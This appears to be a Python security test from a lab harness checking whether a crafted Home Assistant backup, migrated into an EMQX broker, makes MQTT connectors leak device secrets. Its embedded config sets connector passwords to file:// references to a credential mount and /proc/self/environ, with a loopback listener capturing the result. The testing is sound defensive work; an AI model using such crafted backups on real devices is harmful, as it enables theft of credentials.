"""T3: a crafted HA backup migrates MQTT connectors whose `password` is a vendor `file://` secret reference
(emqx_schema_secret.erl:74-77, emqx_secret_loader.erl:28-45) to THIS device's bootstrap-credential mount and to
/proc/self/environ (this device's env secrets). After the product conversion (_build_candidate, real brokers), does the
finished candidate -- i.e. the restored device broker, same env/secret mounts -- read those device secrets and send them
to the server the HA backup named? Lab store, --network none: the "server" is a loopback listener inside the candidate.
Only generated test values; the capture is compared in memory, never printed. Run: python3 -I t3_file_secret_exfil.py <codebase>"""
import io
import json
import os
import secrets
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import secrev_lab as L
import t1_datadir_acl as T1

BOOT = T1.BOOT
CONNECTORS = (b'connectors {\n  mqtt {\n'
              b'    secrev_csv { enable = true, server = "127.0.0.1:18831", username = "x", proto_ver = v4,\n'
              b'      password = "file://' + BOOT.encode() + b'",\n'
              b'      resource_opts { health_check_interval = "5s" } }\n'
              b'    secrev_env { enable = true, server = "127.0.0.1:18832", username = "y", proto_ver = v4,\n'
              b'      password = "file:///proc/self/environ",\n'
              b'      resource_opts { health_check_interval = "5s" } }\n'
              b'  }\n}\n')
LISTEN = ('[spawn(fun() -> {ok, L} = gen_tcp:listen(P, [binary, {active, false}, {reuseaddr, true}, {ip, {127,0,0,1}}]), '
          '{ok, S} = gen_tcp:accept(L, 90000), {ok, B} = gen_tcp:recv(S, 0, 30000), '
          'ok = file:write_file("/opt/emqx/log/secrev-cap-" ++ integer_to_list(P) ++ ".bin", B) end) '
          '|| P <- [18831, 18832]], io:format("WOOWLISTEN:ok:END").')
RESTART = ('[catch emqx_resource:restart(R) || R <- [<<"connector:mqtt:secrev_csv">>, <<"connector:mqtt:secrev_env">>]], '
           'io:format("WOOWRESTART:ok:END").')


def addon_tar():
    base = 'data/emqx/data/'
    return L.tar_bytes({
        'addon.json': json.dumps({'system': {'slug': 'woow-emqx', 'name': 'EMQX'}, 'version': '5.9.1',
                                  'user': {'image': 'ghcr.io/woowtech/woow-ha-emqx-amd64'}, 'state': 'stopped'}).encode(),
        'data/emqx/node.name': b'emqx@127.0.0.1\n',
        base + 'mnesia/emqx@127.0.0.1': None,
        base + 'configs/cluster.hocon': T1.HA_HOCON + CONNECTORS,
        base + 'authz/acl.conf': T1.HA_ACL,
    })


def main(codebase):
    ha_emqx = L.use(codebase)
    started = time.time()
    result = {'test': 'T3 migrated connector file:// secret reference reads this device secrets', 'codebase': codebase,
              'image': L.IMAGE, 'network': 'none', 'store': 'labpodman (separate --root)'}
    host_dir = tempfile.mkdtemp(prefix='t3-host-', dir=os.path.join(L.SR, 'runs'))
    os.chmod(host_dir, 0o755)
    acl_host = os.path.join(host_dir, 'acl.conf')
    with open(acl_host, 'wb') as handle:
        handle.write(T1.TARGET_ACL)
    os.chmod(acl_host, 0o644)
    csv_value = b'user_id,password,is_superuser\nwoow,' + secrets.token_hex(16).encode() + b',false'
    dash_value = secrets.token_hex(12).encode()
    s_boot, s_dash = 'secrev-t3-bootstrap', 'secrev-t3-dashboard'
    for name, value in ((s_boot, csv_value + b'\n'), (s_dash, dash_value)):
        L.lab('secret', 'rm', name, check=False)
        L.lab('secret', 'create', name, '-', input=value)
    specs = [f'{s_boot},type=mount,target={BOOT},uid=1000,gid=1000,mode=0400',
             f'{s_dash},type=env,target=EMQX_DASHBOARD__DEFAULT_PASSWORD']
    target = L.LabTarget('t3', {'configs/cluster.hocon': T1.target_hocon('/opt/emqx/etc/acl.conf')},
                         ro_files=[(acl_host, '/opt/emqx/etc/acl.conf', 'ro')], secrets_spec=specs)
    try:
        runner = L.make_runner()
        work = L.FakeWork(runner)
        inner = addon_tar()
        work.addon_member = lambda slug: slug
        work.open = lambda member: io.BytesIO(inner)
        work.addon_info = lambda slug: L.SimpleNamespace(version='5.9.1')
        app = L.SimpleNamespace(id='emqx', name='EMQX')
        staging = Path(tempfile.mkdtemp(prefix='t3-', dir=os.path.join(L.SR, 'runs')))
        with L.temp(runner) as tmp:
            try:
                ha_emqx._build_candidate(work, app, tmp, target, staging, version='5.8.9')
                result['conversion'] = 'PASSED (candidate built, all product checks green)'
            except L.BackupError as error:
                result['conversion'] = 'REFUSED: ' + error.message
            if tmp.running('emqx-new') and result['conversion'].startswith('PASSED'):
                ex = lambda c, t=120: tmp.exec('emqx-new', c, timeout=t, check=False)
                cfg = ha_emqx.read_effective_config(ex)
                mqtt = (cfg.get('connectors') or {}).get('mqtt') or {}
                result['candidate_connectors'] = sorted(mqtt)
                result['candidate_passwords_are_file_refs'] = sorted(
                    n for n, c in mqtt.items() if str(c.get('password', '')).startswith('file://'))
                result['listen'] = 'WOOWLISTEN:ok' in ex(['emqx', 'eval', LISTEN]).stdout.decode(errors='replace')
                time.sleep(2)
                ex(['emqx', 'eval', RESTART])
                captured = {}
                for _ in range(30):
                    for port in (18831, 18832):
                        if port not in captured:
                            r = ex(['cat', f'/opt/emqx/log/secrev-cap-{port}.bin'], 30)
                            if r.returncode == 0 and r.stdout:
                                captured[port] = r.stdout
                    if len(captured) == 2:
                        break
                    time.sleep(3)
                cap_csv, cap_env = captured.get(18831, b''), captured.get(18832, b'')
                result['csv_connector_sent_connect'] = cap_csv[:1] == b'\x10'
                result['csv_secret_value_in_connect'] = csv_value in cap_csv
                result['env_connector_sent_connect'] = cap_env[:1] == b'\x10'
                result['dashboard_password_in_connect'] = dash_value in cap_env
                result['env_names_in_connect'] = sorted({n for n in (b'EMQX_DASHBOARD__DEFAULT_PASSWORD',
                                                                     b'EMQX_NODE__NAME') if n in cap_env}, key=str)
                result['env_names_in_connect'] = [n.decode() for n in result['env_names_in_connect']]
    finally:
        target.remove()
        for name in (s_boot, s_dash):
            L.lab('secret', 'rm', name, check=False)
    result['device_secret_exfiltrated'] = bool(result.get('csv_secret_value_in_connect')
                                               or result.get('dashboard_password_in_connect'))
    result['elapsed_s'] = round(time.time() - started, 1)
    print(json.dumps(result, ensure_ascii=False, indent=1))
    L.evidence(os.path.join(L.SR, 'runs', f't3-{codebase}.json'), result)


if __name__ == '__main__':
    main(sys.argv[1])
